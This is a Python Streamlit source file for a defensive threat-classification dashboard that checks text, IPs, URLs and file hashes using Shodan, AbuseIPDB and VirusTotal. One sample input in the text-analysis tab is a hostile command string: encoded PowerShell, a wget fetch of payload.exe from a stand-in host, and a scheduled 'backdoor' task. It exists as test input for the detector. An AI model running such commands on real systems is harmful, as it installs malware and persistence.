"""
XYZ Company Cybersecurity Threat Classifier v3.0
With Shodan Integration
"""

import streamlit as st
import time
from datetime import datetime
import json

from core import HybridThreatClassifier, IPChecker, URLAnalyzer, DomainChecker, FileAnalyzer
from utils import get_config, get_logger, InputValidator, ScanDatabase, ReportGenerator

import warnings
warnings.filterwarnings('ignore')

st.set_page_config(page_title="XYZ Company - AI Threat Classifier", page_icon="🛡️", layout="wide")

st.markdown("""
    <style>
    .main-header { text-align: center; padding: 20px; background: linear-gradient(90deg, #1a1a2e 0%, #16213e 100%); border-radius: 10px; margin-bottom: 20px; }
    .main-header h1 { color: #00d4ff; margin: 0; }
    .main-header h3 { color: #888; margin: 10px 0 0 0; }
    .metric-card { padding: 15px; background: #1a1a2e; border-radius: 8px; text-align: center; margin: 5px 0; }
    .vuln-critical { background: #ff000033; border-left: 4px solid #ff0000; padding: 10px; margin: 5px 0; border-radius: 4px; }
    .port-warning { background: #ff880033; border-left: 4px solid #ff8800; padding: 10px; margin: 5px 0; border-radius: 4px; }
    </style>
""", unsafe_allow_html=True)


@st.cache_resource
def load_classifier():
    config = get_config()
    classifier = HybridThreatClassifier(ml_weight=config.model.ml_weight, rule_weight=config.model.rule_weight)
    classifier.train()
    return classifier


@st.cache_resource
def load_analyzers():
    config = get_config()
    return {
        'ip_checker': IPChecker(
            abuseipdb_api_key=config.api_keys.abuseipdb,
            shodan_api_key=config.api_keys.shodan,
            virustotal_api_key=config.api_keys.virustotal
        ),
        'url_analyzer': URLAnalyzer(),
        'domain_checker': DomainChecker(),
        'file_analyzer': FileAnalyzer(virustotal_api_key=config.api_keys.virustotal)
    }


@st.cache_resource
def load_database():
    return ScanDatabase()


classifier = load_classifier()
analyzers = load_analyzers()
database = load_database()
logger = get_logger()
config = get_config()

# Header
st.markdown("""
    <div class='main-header'>
        <h1>🛡️ XYZ Company Security Portal</h1>
        <h3>Hybrid AI + Rule-Based Threat Classification System v3.0</h3>
        <p style='color: #666; font-size: 14px;'>Created by <strong>Pranav Sarotra</strong></p>
    </div>
""", unsafe_allow_html=True)

# Sidebar
with st.sidebar:
    st.markdown("### ⚙️ Model Configuration")
    ml_weight = st.slider("ML Model Weight", 0.0, 1.0, config.model.ml_weight, 0.1)
    classifier.ml_weight = ml_weight
    classifier.rule_weight = 1.0 - ml_weight
    st.caption(f"Rule Weight: {1.0 - ml_weight:.1f}")

    st.markdown("---")
    
    st.markdown("### 🔑 API Status")
    apis = [
        ("ip-api.com", True, "Free"),
        ("AbuseIPDB", bool(config.api_keys.abuseipdb), "Configured" if config.api_keys.abuseipdb else "Not Set"),
        ("Shodan", bool(config.api_keys.shodan), "Configured" if config.api_keys.shodan else "Not Set"),
        ("VirusTotal", bool(config.api_keys.virustotal), "Configured" if config.api_keys.virustotal else "Not Set"),
    ]
    for api_name, status, status_text in apis:
        icon = "✅" if status else "⚪"
        st.markdown(f"{icon} **{api_name}**: {status_text}")

    st.markdown("---")
    
    st.markdown("### 📈 Statistics")
    stats = database.get_statistics()
    st.metric("Total Scans", stats.get('total_scans', 0))
    st.metric("IP Checks", stats.get('total_ip_checks', 0))
    st.metric("URL Checks", stats.get('total_url_checks', 0))

# Main Tabs
tab1, tab2, tab3, tab4, tab5 = st.tabs(["📧 Text Analysis", "🌐 IP Checker", "🔗 URL Analyzer", "🏷️ Hash Lookup", "📜 History"])

# Tab 1: Text Analysis
with tab1:
    st.markdown("### 📧 Email/Log Content Analysis")

    samples = {
        "Phishing Email": "Dear Valued Customer, We have detected unusual activity. Your account will be SUSPENDED within 24 hours. Click here to verify: http://bit.ly/verify-now URGENT!",
        "Malware Log": "powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAA= cmd /c wget http://192.168.1.100/payload.exe schtasks /create /tn backdoor",
        "Safe Email": "Hi Team, Meeting reminder for tomorrow at 2 PM. Please review the attached agenda. Thanks, Sarah"
    }

    sample_option = st.selectbox("Quick Test:", ["-- Select --"] + list(samples.keys()))
    input_text = samples.get(sample_option, "") if sample_option != "-- Select --" else ""

    user_input = st.text_area("Paste content here:", value=input_text, height=200)

    if st.button("🔍 ANALYZE THREAT", type="primary", use_container_width=True):
        if user_input.strip():
            is_valid, sanitized, error = InputValidator.validate_text_input(user_input)
            if not is_valid:
                st.error(f"Invalid input: {error}")
            else:
                with st.spinner("Analyzing..."):
                    logger.scan_started("text", user_input[:50])
                    results = classifier.classify(sanitized)
                    logger.scan_completed(results.classification, results.confidence, results.threat_score)

                database.save_scan({
                    'input_text': user_input[:500], 'classification': results.classification,
                    'confidence': results.confidence, 'threat_score': results.threat_score,
                    'threat_level': results.threat_level, 'indicators': results.indicators,
                    'ml_scores': results.ml_scores, 'rule_scores': results.rule_scores,
                    'recommendations': results.recommendations
                })

                st.markdown("---")
                col1, col2, col3 = st.columns(3)
                with col1:
                    st.markdown(f"### {results.classification}")
                with col2:
                    st.metric("Confidence", f"{results.confidence}%")
                with col3:
                    st.metric("Threat Score", f"{results.threat_score}%")

                if results.indicators:
                    st.markdown("### 🔎 Detected Indicators")
                    for ind in results.indicators:
                        st.warning(ind)

                st.markdown("### 💡 Recommendations")
                for rec in results.recommendations:
                    st.info(rec)

                report = ReportGenerator.generate_text_report({
                    'classification': results.classification, 'confidence': results.confidence,
                    'threat_score': results.threat_score, 'threat_level': results.threat_level,
                    'indicators': results.indicators, 'recommendations': results.recommendations
                })
                st.download_button("📄 Download Report", report, file_name=f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        else:
            st.warning("Please enter text to analyze.")

# Tab 2: IP Checker with Shodan
with tab2:
    st.markdown("### 🌐 IP Address Threat Intelligence")
    st.caption("Powered by ip-api.com, AbuseIPDB, Shodan, and VirusTotal")
    
    ip_input = st.text_input("Enter IP Address:", placeholder="e.g., 8.8.8.8 or 45.33.32.156")
    
    col_btn1, col_btn2 = st.columns([1, 3])
    with col_btn1:
        check_btn = st.button("🔍 Check IP", type="primary", key="check_ip")

    if check_btn:
        if ip_input:
            is_valid, sanitized_ip, error = InputValidator.validate_ip_address(ip_input)
            if not is_valid:
                st.error(error)
            else:
                with st.spinner("Analyzing IP address... This may take a few seconds."):
                    ip_info = analyzers['ip_checker'].check_ip(sanitized_ip, deep_scan=True)
                    summary = analyzers['ip_checker'].get_threat_summary(ip_info)

                # Save to database
                database.save_ip_check({
                    'ip': ip_info.ip, 
                    'country': ip_info.country, 
                    'threat_score': ip_info.threat_score, 
                    'is_vpn': ip_info.is_vpn, 
                    'is_proxy': ip_info.is_proxy
                })

                st.markdown("---")
                
                # Main Metrics Row
                st.markdown("### 📊 Threat Assessment")
                metric_col1, metric_col2, metric_col3, metric_col4 = st.columns(4)
                
                with metric_col1:
                    threat_color = summary.get('threat_level_color', '#888')
                    st.markdown(f"""
                        <div class='metric-card' style='border-left: 4px solid {threat_color};'>
                            <h2 style='color: {threat_color}; margin: 0;'>{summary.get('threat_level', 'UNKNOWN')}</h2>
                            <p style='color: #888; margin: 5px 0 0 0;'>Threat Level</p>
                        </div>
                    """, unsafe_allow_html=True)
                
                with metric_col2:
                    st.metric("Threat Score", f"{ip_info.threat_score:.0f}%")
                
                with metric_col3:
                    st.metric("Reputation", f"{ip_info.reputation_score:.0f}%")
                
                with metric_col4:
                    st.metric("Data Sources", len(ip_info.data_sources))

                st.markdown("---")
                
                # Two Column Layout for Details
                left_col, right_col = st.columns(2)
                
                with left_col:
                    # Location & Network Info
                    st.markdown("### 📍 Location & Network")
                    st.write(f"**Country:** {ip_info.country or 'Unknown'} {ip_info.country_code}")
                    st.write(f"**City:** {ip_info.city or 'Unknown'}")
                    st.write(f"**Region:** {ip_info.region or 'Unknown'}")
                    st.write(f"**Timezone:** {ip_info.timezone or 'Unknown'}")
                    st.write(f"**ISP:** {ip_info.isp or 'Unknown'}")
                    st.write(f"**Organization:** {ip_info.org or 'Unknown'}")
                    st.write(f"**ASN:** {ip_info.asn or 'Unknown'}")
                    if ip_info.reverse_dns:
                        st.write(f"**Reverse DNS:** {ip_info.reverse_dns}")
                
                with right_col:
                    # Security Flags
                    st.markdown("### 🚩 Security Flags")
                    
                    flags_data = [
                        ("🔒 VPN", ip_info.is_vpn),
                        ("🌐 Proxy", ip_info.is_proxy),
                        ("🧅 Tor Exit Node", ip_info.is_tor),
                        ("🏢 Datacenter", ip_info.is_datacenter),
                        ("⚠️ Known Attacker", ip_info.is_known_attacker),
                        ("🚫 Known Abuser", ip_info.is_known_abuser),
                        ("☠️ Threat", ip_info.is_threat),
                    ]
                    
                    for flag_name, flag_value in flags_data:
                        if flag_value:
                            st.error(f"{flag_name}: Yes")
                        else:
                            st.success(f"{flag_name}: No")
                    
                    if ip_info.abuse_confidence_score > 0:
                        st.write(f"**Abuse Confidence:** {ip_info.abuse_confidence_score}%")

                # Shodan Results
                if ip_info.open_ports or ip_info.vulns or ip_info.services:
                    st.markdown("---")
                    st.markdown("### 🔍 Shodan Intelligence")
                    
                    shodan_col1, shodan_col2 = st.columns(2)
                    
                    with shodan_col1:
                        # Open Ports
                        if ip_info.open_ports:
                            st.markdown("#### 🔓 Open Ports")
                            
                            # Highlight suspicious ports
                            suspicious_ports = {
                                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
                                135: "MSRPC", 139: "NetBIOS", 445: "SMB",
                                1433: "MSSQL", 3306: "MySQL", 3389: "RDP",
                                5432: "PostgreSQL", 5900: "VNC", 6379: "Redis"
                            }
                            
                            for port in sorted(ip_info.open_ports):
                                if port in suspicious_ports:
                                    st.markdown(f"""
                                        <div class='port-warning'>
                                            ⚠️ Port {port} ({suspicious_ports[port]}) - Potentially Risky
                                        </div>
                                    """, unsafe_allow_html=True)
                                else:
                                    st.write(f"• Port {port}")
                        else:
                            st.info("No open ports detected by Shodan")
                        
                        # Hostnames
                        if ip_info.hostnames:
                            st.markdown("#### 🌐 Associated Hostnames")
                            for hostname in ip_info.hostnames[:10]:
                                st.write(f"• {hostname}")
                    
                    with shodan_col2:
                        # Vulnerabilities
                        if ip_info.vulns:
                            st.markdown("#### ⚠️ Known Vulnerabilities")
                            st.error(f"**{len(ip_info.vulns)} CVE(s) Detected!**")
                            
                            for vuln in ip_info.vulns[:10]:
                                st.markdown(f"""
                                    <div class='vuln-critical'>
                                        🔴 <a href='https://nvd.nist.gov/vuln/detail/{vuln}' target='_blank'>{vuln}</a>
                                    </div>
                                """, unsafe_allow_html=True)
                            
                            if len(ip_info.vulns) > 10:
                                st.warning(f"... and {len(ip_info.vulns) - 10} more vulnerabilities")
                        else:
                            st.success("✅ No known vulnerabilities detected")
                        
                        # OS Detection
                        if ip_info.os_guess:
                            st.markdown("#### 💻 Operating System")
                            st.write(f"Detected: **{ip_info.os_guess}**")
                    
                    # Services Detail
                    if ip_info.services:
                        with st.expander("📋 View Detected Services", expanded=False):
                            for svc in ip_info.services[:20]:
                                st.markdown(f"""
                                    **Port {svc.get('port')}** ({svc.get('protocol', 'tcp')})
                                    - Service: {svc.get('service', 'unknown')}
                                    - Version: {svc.get('version', 'unknown')}
                                """)
                                if svc.get('banner'):
                                    st.code(svc.get('banner')[:200], language=None)
                                st.markdown("---")

                # Blacklists
                if ip_info.blacklists:
                    st.markdown("### 🚫 Blacklist Detections")
                    for bl in ip_info.blacklists:
                        st.error(f"Listed on: {bl}")

                # Errors
                if ip_info.errors:
                    with st.expander("⚠️ API Errors/Warnings"):
                        for err in ip_info.errors:
                            st.warning(err)

                # Data Sources
                st.markdown("### 📡 Data Sources Used")
                st.write(", ".join(ip_info.data_sources) if ip_info.data_sources else "Local analysis only")

                # Download Report
                st.markdown("### 📥 Export")
                ip_report = ReportGenerator.generate_ip_report({
                    'ip': ip_info.ip,
                    'country': ip_info.country,
                    'city': ip_info.city,
                    'isp': ip_info.isp,
                    'threat_score': ip_info.threat_score,
                    'is_vpn': ip_info.is_vpn,
                    'is_proxy': ip_info.is_proxy,
                    'is_tor': ip_info.is_tor,
                    'open_ports': ip_info.open_ports,
                    'vulns': ip_info.vulns,
                    'hostnames': ip_info.hostnames
                })
                st.download_button(
                    "📄 Download IP Report",
                    ip_report,
                    file_name=f"ip_report_{sanitized_ip}_{datetime.now().strftime('%Y%m%d')}.txt"
                )
        else:
            st.info("Enter an IP address to analyze.")

# Tab 3: URL Analyzer
with tab3:
    st.markdown("### 🔗 URL Security Analysis")
    url_input = st.text_input("Enter URL:", placeholder="e.g., https://example.com")

    if st.button("🔍 Analyze URL", type="primary", key="analyze_url"):
        if url_input:
            is_valid, sanitized_url, error = InputValidator.validate_url(url_input)
            if not is_valid:
                st.error(error)
            else:
                with st.spinner("Analyzing URL..."):
                    url_info = analyzers['url_analyzer'].analyze(sanitized_url)

                database.save_url_check({
                    'url': url_info.url, 
                    'domain': url_info.domain, 
                    'is_suspicious': url_info.is_suspicious, 
                    'threat_score': url_info.threat_score
                })

                status = "⚠️ SUSPICIOUS" if url_info.is_suspicious else "✅ APPEARS SAFE"
                st.markdown(f"### {status}")
                
                col1, col2, col3 = st.columns(3)
                with col1:
                    st.metric("Threat Score", f"{url_info.threat_score}%")
                with col2:
                    st.metric("Phishing Score", f"{url_info.phishing_score}%")
                with col3:
                    st.metric("HTTPS", "Yes ✓" if url_info.is_https else "No ✗")

                if url_info.indicators:
                    st.markdown("### ⚠️ Warning Indicators")
                    for ind in url_info.indicators:
                        st.warning(ind)
        else:
            st.info("Enter a URL to analyze.")

# Tab 4: Hash Lookup
with tab4:
    st.markdown("### 🏷️ File Hash Lookup")
    st.caption("Supports MD5, SHA-1, SHA-256, and SHA-512")
    
    hash_input = st.text_input("Enter Hash:", placeholder="e.g., 44d88612fea8a8f36de82e1278abb02f")

    if st.button("🔍 Lookup Hash", type="primary", key="lookup_hash"):
        if hash_input:
            is_valid, sanitized, hash_type, error = InputValidator.validate_file_hash(hash_input)
            if not is_valid:
                st.error(error)
            else:
                with st.spinner("Looking up hash..."):
                    hash_info = analyzers['file_analyzer'].analyze_hash(sanitized)
                    summary = analyzers['file_analyzer'].get_threat_summary(hash_info)

                col1, col2 = st.columns(2)
                with col1:
                    st.metric("Hash Type", hash_type)
                with col2:
                    st.metric("Threat Level", summary.get('threat_level'))

                if hash_info.is_malware:
                    st.error(f"🦠 MALWARE DETECTED: {', '.join(hash_info.malware_names)}")
                else:
                    st.success("✅ No known malware detected")
        else:
            st.info("Enter a file hash to lookup.")

# Tab 5: History
with tab5:
    st.markdown("### 📜 Scan History")
    
    col1, col2 = st.columns([3, 1])
    with col2:
        if st.button("🗑️ Clear History"):
            database.clear_history()
            st.success("History cleared!")
            st.rerun()

    scans = database.get_recent_scans(20)
    if scans:
        for scan in scans:
            with st.expander(f"{scan['timestamp'][:19]} - {scan['classification']}"):
                st.write(f"**Confidence:** {scan['confidence']}%")
                st.write(f"**Threat Score:** {scan['threat_score']}%")
                st.write(f"**Threat Level:** {scan['threat_level']}")
    else:
        st.info("No scan history yet.")

# Footer
st.markdown("---")
st.markdown("""
    <div style='text-align: center; color: #666;'>
        <p>XYZ Company Security System v3.0</p>
        <p style='font-size: 12px;'>Powered by Machine Learning, AbuseIPDB, Shodan & VirusTotal</p>
        <p style='font-size: 14px;'>Created by <strong>Pranav Sarotra</strong></p>
    </div>
""", unsafe_allow_html=True)